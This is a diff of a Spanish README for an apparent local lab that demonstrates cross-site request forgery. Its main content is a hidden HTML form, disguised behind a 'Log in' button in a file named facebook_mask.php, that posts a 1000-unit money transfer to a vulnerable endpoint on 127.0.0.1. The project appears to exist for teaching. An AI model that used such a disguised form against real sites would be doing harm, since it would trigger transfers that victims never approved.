@@ -9,18 +9,19 @@ El ataque consiste en enviar al sitio web vulnerable el siguiente formulario:
   # facebook_mask.php: 
   
   <form action="process_vulnerable.php?action=transfer" method="POST">
-  
+  <!-- Se considera que existe un usuario en la base de datos llamado usuario-->
   <input type="hidden" name="destinatary" value="usuario">
   <input type="hidden" name="quantity" value="1000">
   <td><div id="button"><input type="submit" value="Log in" id="button"></div></td>
   
   </form>
   ```
-  
+
   Donde value="usuario" es el usuario al que se le transfiere dinero
   y value="1000" es la cantidad de dinero que se transfiere. 
   Por el momento todo se hace en un servidor local, la accion del formulario sería:  http://127.0.0.1/csrf/process_vulnerable.php
-  
+
+
   
 
 # Descripcion de archivos
